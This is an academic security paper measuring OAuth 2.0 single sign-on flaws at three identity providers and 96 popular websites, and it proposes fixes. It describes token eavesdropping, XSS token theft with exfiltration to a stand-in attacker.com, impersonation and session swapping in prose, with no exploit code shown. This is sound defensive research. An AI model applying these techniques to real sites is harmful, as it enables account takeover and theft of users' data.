The Devil is in the (Implementation) Details:
An Empirical Analysis of OAuth SSO Systems

San-Tsai Sun and Konstantin Beznosov

Laboratory for Education and Research in Secure Systems Engineering

Department of Electrical and Computer Engineering

University of British Columbia

Vancouver, Canada

{santsais,beznosov}@ece.ubc.ca

ABSTRACT
Millions of web users today employ their Facebook accounts
to sign into more than one million relying party (RP) web-
sites. This web-based single sign-on (SSO) scheme is enabled
by OAuth 2.0, a web resource authorization protocol that
has been adopted by major service providers. The OAuth
2.0 protocol has proven secure by several formal methods,
but whether it is indeed secure in practice remains an open
question. We examine the implementations of three major
OAuth identity providers (IdP) (Facebook, Microsoft, and
Google) and 96 popular RP websites that support the use
of Facebook accounts for login. Our results uncover several
critical vulnerabilities that allow an attacker to gain unau-
thorized access to the victim user’s proﬁle and social graph,
and impersonate the victim on the RP website. Closer ex-
amination reveals that these vulnerabilities are caused by a
set of design decisions that trade security for implementa-
tion simplicity. To improve the security of OAuth 2.0 SSO
systems in real-world settings, we suggest simple and practi-
cal improvements to the design and implementation of IdPs
and RPs that can be adopted gradually by individual sites.

Categories and Subject Descriptors
D.4.6 [Security and Protection]: Authentication, Access
controls

General Terms
Security

Keywords
OAuth 2.0, Web Single Sign-On

1.

INTRODUCTION

OAuth 2.0 [19], an open and standardized web resource
authorization protocol, enables users to grant third-party

Permission to make digital or hard copies of all or part of this work for
personal or classroom use is granted without fee provided that copies are
not made or distributed for proﬁt or commercial advantage and that copies
bear this notice and the full citation on the ﬁrst page. To copy otherwise, to
republish, to post on servers or to redistribute to lists, requires prior speciﬁc
permission and/or a fee.
CCS’12, October 16–18, 2012, Raleigh, North Carolina, USA.
Copyright 2012 ACM 978-1-4503-1651-4/12/10 ...$10.00.

application access to their web resources without sharing
their login credentials or the full extent of their data. Com-
pared to its predecessor and other existing protocols such
as OpenID [33], Google AuthSub [14], Yahoo BBAuth [48],
and Microsoft Live ID [26], OAuth 2.0 (“OAuth” for short,
unless otherwise speciﬁed) makes it simple for developers to
implement the protocol, and supports a diversity of third-
party applications, such as websites and applications run-
ning on browser, mobile, desktop, or appliance devices. To
use OAuth as a web single sign-on (SSO) scheme, a resource
hosting site (e.g., Facebook) plays the role of an identity
provider (IdP) that maintains the identity information of
the user and authenticates her, while the third-party website
(e.g., CNN) acts as a relying party (RP) that relies on the
authenticated identity to authorize the user and customize
user experience.

Given the popularity of major IdPs and the proliferation
of RP websites, the risk of compromised implementations
can be signiﬁcant. Even though the protocol has yet to be ﬁ-
nalized, there are already over one billion OAuth-based user
accounts provided by major service providers such as Face-
book [11], Google [16] and Microsoft [26]. This enormous
user base attracts millions of RPs that take this opportunity
to reach a broader set of users, and integrate their services
deep into users’ social context [12]. OAuth provides a clear
and compelling business incentive for RPs [41]. The proto-
col enables not only web SSO but also personalized, web-
scale content sharing through social graphs and platform-
speciﬁc services such as messaging, recommendations, rat-
ing, and activity feeds. From adversary’s perspective, how-
ever, the information guarded by OAuth SSO systems can
be attractive as well. Through a successful exploit of an
uncovered weakness in the protocol or implementations, an
adversary could harvest private data from those millions
of users for identify theft, on-line proﬁling, and large-scale
email spam, phishing, and drive-by-download campaigns [5].
The tremendous user base and growing popularity within
these IdP and RP websites could lure numerous adversaries
continually into this “lucrative business.”

To ensure protocol security, several approaches based on
formal methods [32, 8, 38] were used to analyze the OAuth
protocol. The results of those analysis suggest that the
protocol is secure, provided that the comprehensive secu-
rity guidelines from the OAuth working group—included in
“OAuth threat model” [25]—are followed by the IdP and RP.
However, given that the formal proofs are executed on ab-
stract models, some important implementation details could

378be inadvertently left out. Furthermore, it is unclear whether
real implementations actually do follow the above guidelines.
Thus, the research question regarding the security of OAuth
implementations remains open.

OAuth-based SSO systems are built upon the existing
web infrastructure, but web application vulnerabilities (e.g.,
insuﬃcient transport layer protection, cross-site scripting
(XSS), cross-site request forgery (CSRF)) are prevalent [31]
and constantly being exploited [47, 29]. Moreover, as the
protocol messages are passed between the RP and IdP via
the browser, a vulnerability found in the browser could also
lead to signiﬁcant security breaches. To enhance the security
of OAuth SSO systems, our research goal was to furthering
the understanding of (1) how those well-known web vul-
nerabilities could be leveraged to compromise OAuth SSO
systems, (2) the fundamental enabling causes and conse-
quences, (3) how prevalent they are, and (4) how to prevent
them in a practical way. These issues are still poorly under-
stood by researchers and practitioners.

To address these questions, we examined the implementa-
tions of three major IdPs (Facebook, Microsoft, and Google),
and 96 Facebook RPs listed on Google Top 1,000 Web-
sites [15] that provide user experience in English. We treated
IdPs and RPs as black boxes, and relied on the analysis of
the HTTP messages passing through the browser during an
SSO login session. In particular, we traced the information
ﬂow of SSO credentials (i.e., data used by the RP server-
side program logics to identify the current SSO user) to ex-
plore potential exploit opportunities. For each uncovered
vulnerability, an exploit was designed and tested using a set
of semi-automatic evaluation tools that we implemented to
avoid errors introduced by manual inspections.

One of our key ﬁndings is that the conﬁdentiality of the
temporary secret key to the user’s accounts can be compro-
mised. In OAuth, an access token that represents the scope
and duration of a resource authorization is the temporary
secret key to the user’s accounts on both RP and IdP web-
sites; and any party with the possession of an access token
can assume the same rights granted to the token by the re-
source owner. Like a capability, if forged or copied, it allows
an adversary to obtain unauthorized access. Our analysis
reveals that, although the OAuth protocol itself is secure,
the conﬁdentiality of access tokens can be compromised in
several ways.

First, the OAuth protocol is designed speciﬁcally to pre-
vent access tokens from exposing in the network (further
discussed in Section 2), and yet we found that many ac-
cess tokens obtained on the browser side are transmitted in
unprotected form to the RP server side for the purpose of
authentication state synchronization. In some RPs, access
tokens are appended as query parameters to the RP’s sign-in
endpoint (i.e., the URI that issues the authenticated session
cookie), which reveals the tokens in the browser’s history
and server logs. Moreover, to simplify accessibility, IdPs’
JavaScript SDKs or RPs themselves store access tokens into
HTTP cookies, and hence opens the tokens to a wide range
of attacks (e.g., network eavesdropping, XSS cookie theft).
Surprisingly, our evaluation shows that only 21% of RPs em-
ploy SSL to protect SSO sessions, even though about half of
tested RPs have protected their traditional login forms with
SSL.

Second, and more interestingly, access tokens can be stolen
on most (91%) of the evaluated RPs, if an adversary could

exploit an XSS vulnerability on any page of the RP web-
site. Obviously, an XSS vulnerability found on the login
page of an RP for which access tokens are obtained on the
browser-side (i.e., client-ﬂow ) could allow an adversary to
steal access tokens during the SSO process. Nevertheless,
our test exploit even succeeded on RPs that obtain access
tokens only through a direct communication with the IdP
(i.e., server-ﬂow, not via browser), regardless of whether
the user has already logged into the RP website, and when
the redirect URL is SSL-protected. XSS vulnerabilities are
prevalent [31, 4], and their complete mitigation is shown to
be diﬃcult [9, 21, 35, 44, 28, 34].

Third, even assuming the RP website itself is free from
XSS vulnerabilities, cross-site access token theft could be
carried out by leveraging certain vulnerabilities found in
browsers. We analyzed and tested two such exploit scenarios
in which the vulnerable browsers are still used by about 10%
of web users [45]. The ﬁrst exploit executes the token theft
script embedded in an image ﬁle by leveraging the browser’s
content-sniﬃng algorithm [1]. The second one steals an ac-
cess token by sending a forged authorization request through
a script element and then extracting the token via onerror
event handler which contains cross-origin vulnerability [30].
In addition to access tokens, our evaluation results show
that an attacker could gain complete control of the victim’s
account on many RPs (64%) by sending a forged SSO cre-
dential to the RP’s sign-in endpoint through a user-agent
controlled by the attacker. Interestingly, some RPs obtain
the user’s IdP account proﬁle on the client-side, and then
pass it as an SSO credential to the sign-in endpoint on the
server side to identify the user. However, this allows an at-
tacker to impersonate the victim user by simply using the
victim’s publicly accessible Facebook account identiﬁer.

Various CSRF exploits can be leveraged to compromise
users’ data residing on RPs, and assist XSS token theft at-
tacks. When the authenticity of SSO credentials—such as
the access token, authorization code, or user identiﬁer—is
not veriﬁed by the receiving RP website, this weakness could
be exploited to mount a session swapping attack [2], which
forces a victim user to sign into the RP as the attacker in
order to spoof the victim’s personal information (e.g., tricks
the victim into linking her credit card to the attacker’s ac-
count), or mount an XSS attack as we discovered. Further-
more, due to insuﬃcient CSRF protection by RPs, many
tested RPs are vulnerable to a force-login attack [42] that
allows a web attacker to stealthily force a victim user to sign
into the RP. After a successful force-login attack, our eval-
uation found that an adversary could use CSRF attacks to
alter the users’ proﬁle information on 21% of the evaluated
RPs. More interestingly, we found that a session swapping
or force-login vulnerability can be leveraged to (1) overcome
an attack constraint in which an authenticated session with
the RP is prerequisite for a successful XSS exploit, and (2)
bootstrap a token theft attack by luring a victim user to
view a maliciously crafted page anywhere on the web, when
a user’s RP account information is not sanitized for XSS.

Unlike logic ﬂaws, the fundamental causes of the uncov-
ered vulnerabilities cannot simply be removed with a soft-
ware patch. Our analysis reveals that those uncovered weak-
nesses are caused by a combination of implementation sim-
plicity features oﬀered by the design of OAuth 2.0 and IdP
implementations, such as the removal of the digital signature
from the protocol speciﬁcation, the support of client-ﬂow,

379and an “automatic authorization granting” feature. While
these simplicity features could be problematic for security,
they are what allow OAuth SSO to achieve rapid and widespread
adoption.

We aimed to design practical mitigation mechanisms that
could prevent or reduce the uncovered threats without sac-
riﬁcing simplicity. To be practical, our proposed improve-
ments do not require modiﬁcations from the OAuth protocol
or browsers, and can be adopted by IdPs and RPs gradually
and separately. Moreover, the suggested recommendations
do not require cryptographic operations from RPs because
understanding the details of signature algorithms and how
to construct and sign their base string is the common source
of problems for many SSO RP developers [36].

As OAuth SSO systems are being employed to guard bil-
lions of user accounts on IdPs and RPs, the insights from our
work are practically important and urgent, and could not be
obtained without an in-depth analysis and evaluation. To
summarize, this work makes the following contributions: (1)
the ﬁrst empirical investigation of the security of a represen-
tative sample of most-visited OAuth SSO implementations,
and a discovery of several critical vulnerabilities, (2) an eval-
uation of the discovered vulnerabilities and an assessment of
their prevalence across RP implementations, and (3) a de-
velopment of practical recommendations for IdPs and RPs
to secure their implementations.

The rest of the paper is organized as follows: The next
section introduces the OAuth 2.0 protocol and discusses re-
lated work. Section 3 provides an overview of our approach,
and Section 4 presents the evaluation procedures and results.
In Section 5, the implications of our results are discussed.
We describe our proposed countermeasures in Section 6, and
summarize the paper and outline future work in Section 7.

2. BACKGROUND AND RELATED WORK
Many websites expose their services through web APIs
to facilitate user content sharing and integration. Building
upon the actual implementation experience of proprietary
protocols, such as Google AuthSub, Yahoo BBAuth and
Flickr API, the OAuth 2.0 protocol is an open and stan-
dardized API authorization protocol that enables users to
grant third-party applications with limited access to their
resources stored at a website. The authorization is made
without sharing the user’s long-term credentials, such as
passwords, and allows the user to selectively revoke an appli-
cation’s access to their account. OAuth is designed as an au-
thorization protocol, but many implementations of OAuth
2.0 are being deployed for web single sign-on (SSO), and
thus authentication. In these cases, user identity informa-
tion hosted on an IdP is authorized by the user and shared
as a web resource for RPs to identify the current SSO user.
Compared to its predecessor, OAuth 2.0 tends to make
the protocol simple for RP developers to implement. First,
it removes the digital signature requirements from the spec-
iﬁcation, and relies on SSL as the default way for communi-
cation between the RP and IdP. This also improves perfor-
mance as the protocol becomes stateless without requiring
RPs to store temporary token credentials. Second, it splits
out ﬂows for diﬀerent security contexts and client applica-
tions. In particular, in the context of SSO, it supports client-
ﬂow so that the OAuth protocol can be executed completely
within a browser.

Figure 1: The server-ﬂow protocol sequences.

2.1 How OAuth 2.0 works

OAuth-based SSO systems are based on browser redirec-
tion in which an RP redirects the user’s browser to an IdP
that interacts with the user before redirecting the user back
to the RP website. The IdP authenticates the user, iden-
tiﬁes the RP to the user, and asks for permission to grant
the RP access to resources and services on behalf of the user.
Once the requested permissions are granted, the user is redi-
rected back to the RP with an access token that represents
the granted permissions. With the authorized access token,
the RP then calls web APIs published by the IdP to access
the user’s proﬁle attributes.

The OAuth 2.0 speciﬁcation deﬁnes two ﬂows for RPs
to obtain access tokens: server-ﬂow (known as the “Au-
thorization Code Grant” in the speciﬁcation), intended for
web applications that receive access tokens from their server-
side program logic; and client-ﬂow (known as the “Implicit
Grant”) for JavaScript applications running in a web browser.
Figure 1 illustrates the following steps, which demonstrate
how server-ﬂow works:

1. User U clicks on the social login button, and the browser

B sends this login HTTP request to RP.

2. RP sends response_type=code, client ID i (a random
unique RP identiﬁer assigned during registration with the
IdP), requested permission scope p, and a redirect URL
r to IdP via B to obtain an authorization response. The
redirect URL r is where IdP should return the response
back to RP (via B). RP could also include an optional
state parameter a, which will be appended to r by IdP
when redirecting U back to RP, to maintain the state
between the request and response. All information in the
authorization request is publicly known by an adversary.
3. B sends response_type=code, i, p, r and optional a to
IdP. IdP checks i, p and r against its own local storage.
4. IdP presents a login form to authenticate the user. This
step could be omitted if U has already authenticated in
the same browser session.

5. U provides her credentials to authenticate with IdP, and
then consents to the release of her proﬁle information.
The consent step could be omitted if p has been granted
by U before.

6. IdP generates an authorization code c, and then redi-
rects B to r with c and a (if presented) appended as
parameters.

7. B sends c and a to r on RP.
8. RP sends i, r, c and a client secret s (established dur-
ing registration with the IdP) to IdP’s token exchange
endpoint through a direct communication (i.e., not via
B).

380Figure 2: The client-ﬂow protocol sequences.

9. IdP checks i, r, c and s, and returns an access token t to

RP.

10. RP makes a web API call to IdP with t.
11. IdP validates t and returns U’s proﬁle attributes for RP

to create an authenticated session.

The client-ﬂow is designed for applications that cannot
embed a secret key, such as JavaScript clients. The access
token is returned directly in the redirect URI, and its secu-
rity is handled in two ways: (1) The IdP validates whether
the redirect URI matches a pre-registered URL to ensure
the access token is not sent to unauthorized parties; (2) the
token itself is appended as an URI fragment (#) of the redi-
rect URI so that the browser will never send it to the server,
and hence preventing the token from being exposed in the
network. Figure 2 illustrates how client-ﬂow works:

1. User U initiates an SSO process by clicking on the social

login button rendered by RP.

2. B sends response_type=token, client ID i, permission
scope p, redirect URL r and an optional state parameter
a to IdP.

3. Same as sever-ﬂow step 4 (i.e., authentication).
4. Same as sever-ﬂow step 5 (i.e., authorization).
5. IdP returns an access token t appended as an URI frag-
ment of r to RP via B. State parameter a is appended
as a query parameter if presented.

6. B sends a to r on RP. Note that B retains the URI
fragment locally, and does not include t in the request to
RP.

7. RP returns a web page containing a script to B. The

script extracts t contained in the fragment using JavaScript
command such as document.location.hash.

8. With t, the script could call IdP’s web API to retrieve
U’s proﬁle on the client-side, and then send U’s proﬁle
to RP’s sign-in endpoint; or the script may send t to RP
directly, and then retrieve U’s proﬁle from RP’s server-
side.

2.2 Related work

The “OAuth Threat Model” [25] is the oﬃcial OAuth 2.0
security guide that provides a comprehensive threat model
and countermeasures for implementation developers to fol-
low. Several formal approaches have been used to examine
the OAuth 2.0 protocol. Pai et al. [32] formalize the proto-
col using Alloy framework [22], and their result conﬁrms a
known security issue discussed in Section 4.1.1 of the “OAuth
Threat Model”. Chari et al. [8] analyze OAuth 2.0 server-
ﬂow in the Universal Composability Security framework [7],
and the result shows that the protocol is secure if all end-
points from IdP and RP are SSL protected. Slack et al. [38]

use Murphi [10] to verify OAuth 2.0 client-ﬂow, and conﬁrm
a threat documented in the “OAuth Threat Model” (i.e.,
CSRF attack against redirect URI). However valuable these
ﬁndings are, as the formal proofs are executed on the ab-
stract models of the OAuth protocol, subtle implementation
details and browser behaviors might be ignored. To comple-
ment formal approaches, we performed a security analysis
through empirical examinations of real-world IdP and RP
implementations.

Many researchers have studied the security of Facebook
Connect protocol—the predecessor of Facebook OAuth 2.0,
which has already been deprecated and replaced by OAuth
2.0 as the default Facebook Platform authentication and au-
thorization protocol. Each study employs a diﬀerent method
to examine the protocol, including formal model checking
using AVISPA [27], symbolic execution that investigates if
postMessage HTML5 API is used in an insecure manner [20],
and labeling HTTP messages going through the browser to
explore exploit opportunities [46].

The vulnerability discovery methodology employed by our
work and Wang et al. [46] are similar (i.e., examining the
browser relayed messages), but diﬀerent in two important
aspects. First, we assume a practical adversary model based
on existing literature in which an attacker can eavesdrop un-
encrypted traﬃc between the browser and the RP server,
and that application and browser vulnerabilities could be
leveraged by an attacker. Without this assumption, only
the impersonation attack on RPs that use user proﬁles from
the IdP as SSO credentials could be identiﬁed by Wang et
al. [46], but not other weaknesses we unveiled. Second, we
focused on OAuth 2.0 rather than generic SSO. This focus
allowed us to (1) identify the gaps between the protocol spec-
iﬁcation and implementations, (2) design semi-automatic as-
sessment tools to examine the prevalence of each uncovered
weakness, whereas the work in [46] requires in-depth knowl-
edge from domain experts to evaluate an exploit, and (3)
investigate fundamental causes (rather than implementation
logic ﬂaws found in [46]), and propose simple and practical
improvements that are applicable to all current OAuth IdPs
and RPs (instead of speciﬁc websites), and can be adopted
gradually by individual sites.

3. APPROACH

Our overall approach consists of two empirical studies that
examine a representative sample of the most popular OAuth
SSO implementations: an exploratory study, which analyzes
potential threats users faced when using OAuth SSO for
login, and a conﬁrmatory study that evaluates how prevalent
those uncovered threats are. Throughout both studies, we
investigate the root causes of those threats in order to design
eﬀective and practical protection mechanisms.

We examined the implementations of three high-proﬁle
IdPs, including Facebook, Microsoft and Google. We could
not evaluate Yahoo and Twitter as they were using OAuth
1.0 at the time of writing. For the samples of RP web-
sites, we looked through the list of Google’s Top 1,000 Most-
Visited Websites [15]. We excluded non-English websites
(527), and only chose websites that support the use of Face-
book accounts for login (96), because Google’s OAuth 2.0
implementation was still under experiment, and the imple-
mentation from Microsoft had just been released.

On December 13th, 2011, Facebook released a “breaking
change” to its JavaScript SDK. The updated SDK uses a

381signed authorization code in place of an access token for
the cookie being set by the SDK library [6]. This change
avoids exposure of the access token in the network, but it
also breaks the existing SSO functions of RP websites that
rely on the token stored in the cookie. This particular event
gave us an opportunity to investigate how client-ﬂow RPs
handle SSO without the presence of access tokens in cookies,
and whether their coping strategies introduce potential risks.
3.1 Adversary Model

We assume the user’s browser and computer are not com-
promised, the IdP and RP are benign, and that the commu-
nication between the RP and IdP is secured. In addition,
our threat model assumes that the conﬁdentiality, integrity,
and availability of OAuth related credentials (e.g., access
token, authorization code, client secret) are guaranteed by
the IdP. In our adversary model, the goal of an adversary
is to gain unauthorized access to the victim user’s personal
data on the IdP or RP website. There are two diﬀerent ad-
versary types considered in this work, which vary on their
attack capabilities:
• A web attacker can post comments that include static
content (e.g., images, or stylesheet) on a benign website,
setup a malicious website, send malicious links via spam
or an Ads network, and exploit web vulnerabilities at RP
websites. Malicious content crafted by a web attacker can
cause the browser to issue HTTP requests to RP and IdP
websites using both GET and POST methods, or execute
the scripts implanted by the attacker.
• A passive network attacker can sniﬀ unencrypted net-
work traﬃc between the browser and the RP (e.g., un-
secured Wi-Fi wireless network). We assume that the
client’s DNS/ARP function is intact, and hence do not
consider man-in-the-middle (MITM) network attackers.
An MITM attacker can alter the script of a redirect URI
to steal access tokens directly, which is an obvious threat
that has been already discussed in the “OAuth Threat
Model” (Section 4.4.2.4).

3.2 Methodology

Academic researchers undertaking a security analysis of
real-world OAuth SSO systems face unique challenges. These
technical constraints include the lack of access to the im-
plementation code, undocumented implementation-speciﬁc
design features, the complexity of client-side JavaScript li-
braries, and the diﬃculty of conducting realistic evaluations
without putting real users and websites at risk.
In our
methodology, we treated IdPs and RPs as black boxes, and
analyzed the HTTP traﬃc going through the browser during
an SSO login session to identify exploit opportunities.

In the initial stage, we implemented a sample RP for
each IdP under examination to observe and understand IdP-
speciﬁc mechanisms that are not covered or mandated by the
speciﬁcation and the “OAuth Threat Model”. In addition to
other ﬁndings, we found that each evaluated IdP oﬀers a
JavaScript SDK to simplify RP development eﬀorts. The
SDK library implements a variant of client-ﬂow, and pro-
vides a set of functions and event-handling mechanisms in-
tended to free RP developers from implementing the OAuth
protocol by themselves. We observed several IdP-speciﬁc
mechanisms that deserve further investigation, as illustrated
in Table 1: (1) SDKs save access tokens into HTTP cook-
ies, (2) authorization codes are not restricted to one-time

Mechanisms (Sections)

GL

1. Token cookie (4.1, 5.1)
2. Authz. code (4.3, 5.1)
3. Implicit authz. (4.2, 5.2)
4. Cross-domain comm. (5.3)
5. Redirect URI (4.2, 5.2, 6.1) MD WL+MD5
6. Refresh token (5.2, 6.1)

N

N

Y

FB
Y1
MU SU
Y
Y2

Y
Y3

MS

Y
MU
Y
N4
SD
Y6

IdP-speciﬁc

1:
Table
implementation mechanisms.
FB=Facebook; GL=Google, MS=Microsoft;
Acronyms:
Y=Yes; N=No; MU=Multiple Use;
SU=Single Use;
MD=Multiple Domain; WL=Whitelist; SD=Single Domain.
Notes: 1: prior to the ﬁx; 2: postMessage and Flash; 3: postMes-
sage, Flash, FIM, RMR and NIX; 4: use cookie; 5: whitelist
for client and server-ﬂow, but multiple domains for SDK ﬂow;
6: only when an oﬄine permission is requested.

use, (3) access tokens are obtained even before the end-user
initiating the login process, (4) access tokens are passing
through cross-domain communication mechanisms, (5) redi-
rect URI restriction is based on an HTTP domain instead
of a whitelist, and (6) a token refresh mechanism is absent
from Facebook’s implementation. The security implications
of each observation are further discussed in the denoted sec-
tions.

In the second stage of our exploratory study, we manu-
ally recorded and analyzed HTTP traﬃc from 15 Facebook
RPs (randomly chose from the list of 96 RP samples). The
analysis was conducted both before and after the Facebook
SDK revision event. From the analysis of network traces, we
identiﬁed several exploitable weaknesses in the RP imple-
mentations. For each vulnerability, a corresponding exploit
was designed and manually tested on those 15 RPs.

In the conﬁrmatory study, a set of semi-automatic vulner-
ability assessment tools were designed and implemented to
facilitate the evaluation process and avoid errors from man-
ual inspections. The tools were then employed to evaluate
each uncovered vulnerability on 96 Facebook RPs. For each
failed exploitation, we manually examined the reasons.

4. EVALUATION AND RESULTS

To begin an assessment process, the evaluator signs into
the RP in question using both traditional and SSO options
through a Firefox browser. The browser is augmented with
an add-on we designed that records and analyzes the HTTP
requests and responses passing through the browser. To
resemble a real-world attack scenario, we implemented a
website, denoted as attacker.com, that retrieves the analysis
results from the trace logs, and feeds them into each assess-
ment module described below. Table 2 shows the summary
of our evaluation results. We found 42% of RPs use server-
ﬂow, and 58% support client-ﬂow; but all client-ﬂow RPs
use Facebook SDK instead of handling the OAuth protocol
themselves. In the following sections, we describe how each
exploit works, the corresponding assessment procedures and
evaluation results.
4.1 Access token eavesdropping (A1)

This exploit eavesdrops access tokens by sniﬃng on the
unencrypted communication between the browser and RP
server. To assess this exploit, the log analyzer traces the ac-
cess token from its origin, and checks if the token is passed
through any subsequent communication between the browser

382RPs

SSL (%)

Vulnerabilities (%)

RPs

Client

Flow SSO credential N % T
14
7
0
18
1
9
49

code
token
proﬁle
code
token
proﬁle

36
17
4
25
4
13
100

35
17
4
24
4
12
96

Gigya
Total

Server

SSL % Vul. %
S A3 A4
4
4
2
8
3
0
10
7
1
1
6
6
21
33

25
15
3
11
3
6
64

Flow N % T
21
Client
Server
28
49
Total

58
42
100

56
40
96

S

6
15
21

A1 A2 A3 A4 A5
18
25
7
20
38
32

43
21
64

16
18
34

55
36
91

Table 2: The percentage of RPs that is vulnerable to each
exploit. Legends: T: SSL is used in the traditional login
form; S: Sign-in endpoint is SSL-protected; A1: Access token
eavesdropping; A2: Access token theft via XSS; A3: Imper-
sonation; A4: Session swapping; A5: Force-login.

and the RP server without SSL protection. We also im-
plemented an access token network sniﬀer to conﬁrm the
results. According to the OAuth speciﬁcation, an access to-
ken is never exposed in the network between the browser
and the RP server. However, our results show that access
tokens can be eavesdropped on 32% of RPs.

Initially, we found that Facebook and Microsoft SDKs
store the access token into an HTTP cookie on the RP do-
main by default, and all client-ﬂow RPs use this cookie as an
SSO credential to identify the user on the server side. How-
ever, as the cookie is created without secured and HTTP-
only attributes, it could be eavesdropped on the network,
or hijacked by malicious scripts injected on any page under
the RP domain. To address this issue, Facebook revised its
SDK to use a signed authorization code in place of an access
token for the cookie [6]. We re-executed the evaluation and
found that, many RPs save the token into a cookie them-
selves, or pass the access token as a query parameter to a
sign-in endpoint on the RP server side. Surprisingly, even
server-ﬂow RPs (7%) exhibit this insecure practice.

SSL provides end-to-end protection, and is commonly sug-
gested for mitigating attacks that manipulate network traf-
ﬁc. However, SSL imposes management and performance
overhead, makes web contents non-cacheable, and introduces
undesired side-eﬀects such as browser warnings about mixed
secure (HTTPS) and insecure (HTTP) content [42]. Due to
these unwanted complications, many websites use SSL only
for login pages. We found 49% of RPs employ SSL to pro-
tect their traditional login forms, but only 21% use SSL
for the sign-in endpoints. The reason behind this insecure
practice is unclear to us, but it might be due to the miscon-
ception that the communication channel is SSL-protected by
the IdP.
4.2 Access token theft via XSS (A2)

The IdP’s “automatic authorization granting” feature re-
turns an access token automatically (i.e., without the user’s
intervention) for an authorization request, if the requested
permissions denoted in the request have been granted by the
user previously, and the user has already logged into the IdP
in the same browser session. The rationales behind this de-
sign feature are detailed in Section 5.2. This automatic au-
thorization mechanism allows an attacker to steal an access
token by injecting a malicious script into any page of an RP
website to initiate a client-side login ﬂow and subsequently
obtain the responded token. To evaluate this vulnerability,
two exploits in JavaScript were designed (listed in Appendix
A and B). Both exploits send a forged authorization request
to the Facebook authorization server via a hidden iframe el-
ement when executed. The ﬁrst exploit uses the current page
as the redirect URI, and extracts the access token from the

Table 3: The percentages of RPs that are vulnerable to
impersonation (A3) or session swapping (A4) attacks.

fragment identiﬁer. The second exploit dynamically loads
the SDK and uses a special SDK function (getLoginStatus)
to obtain the access token. In order to conduct a realistic
evaluation without introducing actual harm to the testing
RPs and real users, we used GreasyMonkey [24], a Firefox
add-on, to execute these two exploits.

To evaluate, the evaluator logs into the IdP and visits the
RP in question (without signing in) using a GreasyMonkey
augmented browser. Both exploit scripts create a hidden
iframe element to transport a forged authorization request
to the IdP, and then obtain an access token in return. Once
the access token is obtained, the exploit script sends it back
to attacker.com using a dynamically created img element.
With this stolen access token, attacker.com then calls the
IdP’s web APIs to verify whether the exploit has been car-
ried out successfully.

Our evaluation results show that 88% of RPs are vulnera-
ble to the ﬁrst exploit regardless of their supporting ﬂow or
whether the user has logged into the RP website. RPs that
are resistant to this exploit either framebusted their home
pages (i.e., cannot be framed), or used a diﬀerent domain for
the redirect URI (i.e., login.rp.com for www.rp.com). The
second exploit succeeded on all evaluated RPs except those
that use a diﬀerent HTTP domain for receiving authoriza-
tion responses.

Additionally, we examined the feasibility of a scenario in
which the browser is the one that makes token theft possi-
ble, instead of relying on the RP website having an XSS
vulnerability. We tested two such scenarios, but believe
that other current and future exploits are possible. In both
test cases, the vulnerable browsers are still used by about
10% of web users [45]. First, we embedded each exploit in
a JPG image ﬁle and uploaded them onto the RP under
test. The evaluator then used IE 7 to view the uploaded
image, which caused the XSS payload being executed due
to the browser’s content-sniﬃng algorithm [1]. Second, we
designed an exploit script (see Appendix C) that leverages
certain browsers’ onerror event handling behavior. In those
browsers [30], the URL that triggers the script error is dis-
closed to the onerror handler. We tested the exploit using
Firefox 3.6.3, and it succeeded on all evaluated RPs. The ex-
ploit script sends a forged authorization request through the
src attribute of a dynamically created script element, and
then extracts the access token via onerror event handler.
4.3 Impersonation (A3)

An impersonation attack works by sending a stolen or
guessed SSO credential to the RP’s sign-in endpoint through
an attacker-controlled user-agent. We found that an imper-
sonation attack could be successfully carried out if (1) the
attacker can obtain or guess a copy of the victim’s SSO cre-

383dential, (2) the SSO credential is not limited to one-time
use, and (3) the RP in question does not check whether the
response is sent by the same browser from which the autho-
rization request was issued (i.e., lack of “contextual binding”
validation).

We designed an “impersonator” tool in C# to evaluate
this vulnerability. The tool reuses GeckoFX web browser
control [37] for sending HTTP requests and rendering the
received HTML content. We modiﬁed GeckoFX to make it
capable of observing and altering HTTP requests, including
headers. Based on the RP domain entered by the evalua-
tor, the tool constructs an exploit request based on the SSO
credential and sign-in endpoint retrieved from attacker.com,
and then sends it to the RP through the GeckoFX browser
control. In addition, for RPs that use the user’s IdP account
proﬁle as an SSO credential, the evaluator replaced the pro-
ﬁle information with one from another testing account to
test whether the SSO credential is guessable. Table 3 shows
our evaluation results. Interestingly, several RPs (9%) use
the user’s IdP proﬁle as an SSO credential. This allows an
attacker to log into the RP as the victim by simply using
the victim’s Facebook account identifer, which is publicly
accessible.

We also found that 13% of RPs use a proxy service from
Gigya [13], and half of them are vulnerable to an imperson-
ation attack, because the signatures signed by Gigya are not
veriﬁed by those RPs. The Gigya platform provides a uni-
ﬁed protocol interface for RPs to integrate a diverse range
of web SSO protocols. The proxy service performs OAuth
server-ﬂow on behalf of the website, requests and stores the
user’s proﬁle attributes, and then passes the user’s proﬁle via
a redirect URI registered with the proxy service or through
cross-domain communication channels. While useful, we be-
lieve that a malicious or compromised proxy service could
result in serious security breaches, because RPs need to pro-
vide the proxy service with their application secret for each
supported IdP, and all access tokens are passed through the
proxy server.

4.4 Session swapping (A4)

Session swapping is another way to exploit the lack of con-
textual binding vulnerability; that is, the RP doesn’t pro-
vide a state parameter in an authorization request (Step 2
in Figure 1 and 2) to maintain the state between the request
and response. The state parameter is typically a value that
is bound to the browser session (e.g., a hash of the session),
which will be appended to the corresponding response by
the IdP when redirecting the user back to the RP (Step 7
in Figure 1, and Step 6 in Figure 2). To launch a session
swapping attack, the attacker (1) signs into an RP using the
attacker’s identity from the IdP, (2) intercepts the SSO cre-
dential on his user-agent (Step 7 in Figure 1, and Step 8 in
Figure 2), and then (3) embeds the intercepted SSO creden-
tial in an HTML construct (e.g., img, iframe) that causes
the browser to automatically send the intercepted SSO cre-
dential to the RP’s sign-in endpoint when the exploit page is
viewed by a victim user. As the intercepted SSO credential
is bound to the attacker’s account on the RP, a successful
session swapping exploit allows the attacker to stealthily log
the victim into her RP as the attacker to spoof the victim’s
personal data [2], or mount a XSS attack as we discussed in
Section 5.5.

To evaluate this vulnerability, we designed an exploit page

hosted on attacker.com. The exploit page takes an RP do-
main as input parameter, retrieves the SSO credential and
sign-in endpoint as an exploit request for the RP in question
from the log, and then sets the exploit request as the src
of a dynamically created iframe element. Malicious con-
tent embedded in the iframe can cause the browser to issue
an HTTP request to the RP website using both GET and
POST methods, but the exploit request cannot have custom
HTTP headers, such as cookies. When the POST method
is used by the RP, the iframe’s src attribute is set to an-
other page that contains (1) a web form with the action
attribute set to the URL of the exploit request, and each
HTTP query parameter (key-value pair) in the exploit re-
quest is added to the form as a hidden input ﬁeld, and (2)
a JavaScript that submits the web form automatically when
the page is loaded.
